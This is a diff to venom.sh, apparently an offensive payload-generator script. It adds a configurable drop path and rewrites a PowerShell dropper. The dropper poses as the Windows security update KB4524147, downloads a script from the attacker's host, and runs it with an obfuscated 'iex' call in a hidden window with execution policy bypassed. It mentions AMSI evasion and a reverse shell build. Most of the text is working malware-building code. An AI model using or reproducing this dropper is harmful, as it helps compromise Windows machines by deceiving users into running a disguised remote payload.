@@ -12017,11 +12017,13 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp (*)\nexample: ProgramFiles\nexample: LocalAppData\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop." --entry --width 350) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$rpath" ]; then rpath="tmp";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
@@ -12035,7 +12037,7 @@ cat << !
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : Fileless (ram)
+    UPLOADTO : Fileless ($rpath)
 !
 echo "---"
 
@@ -12059,12 +12061,11 @@ echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 
 
 ## Attempting to hidde powershell execution terminal
-# DESCRIPTION: dropper.bat will write in %tmp% folder the dropper/exec (Agent.ps1)
-# and them execute it in a powershell hidden console <-- need to know if this works ..
-# HOW TO: 1º - Comment (#) the above dropper build
-# 2º - Un-Comment (#) this follow dropper build
-# 3º - Save venom.sh and test it
-#
+# DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (Agent.ps1)
+# and then execute it in a powershell hidden console <-- need to know if this works ..
+# HOW TO: 1º - Comment (#) the above dropper build (line 12047 to 12060)
+# 2º - Un-Comment (#) this follow dropper build (line 12069 to 12083)
+# ---
 #echo "<#" > $IPATH/output/$Drop.ps1
 #echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
 #echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
@@ -12072,13 +12073,15 @@ echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 #echo "#>" >> $IPATH/output/$Drop.ps1
 #echo "" >> $IPATH/output/$Drop.ps1
 #echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"   Get-HotFix;\`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.send();\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:tmp\\Agent.ps1\"" >> $IPATH/output/$Drop.ps1
-## END - Attempting to hidde powershell execution terminal
+#echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\";" >> $IPATH/output/$Drop.ps1
+#echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\Agent.ps1\"" >> $IPATH/output/$Drop.ps1
+## --- END - Attempting to hidde powershell execution terminal
 
 
 ## Build Reverse Powershell Shell
